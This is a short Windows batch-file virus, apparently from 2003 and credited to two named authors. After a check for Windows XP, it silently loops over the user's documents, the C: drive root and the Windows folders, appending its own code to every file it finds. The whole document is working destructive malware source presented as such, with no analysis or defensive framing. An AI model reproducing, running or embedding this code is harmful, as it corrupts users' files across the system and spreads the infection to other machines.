:: 
:: BATlle-Field.b for winXP
::
:: Created for DM 3.0 by DvL and Ratty
:: 18.05.2003
::
:: Created by 2 good friends reunited
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
::
@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto done
if not errorlevel 1 goto :XP
:XP
for /r \ %%x in (c:\mydocu~1\*.*, c:\*.*, *.*, %windir%\*.*, %winbootdir%\*.*) do copy %%x+%0 %%x
ctty con
exit
:done
ctty con
cls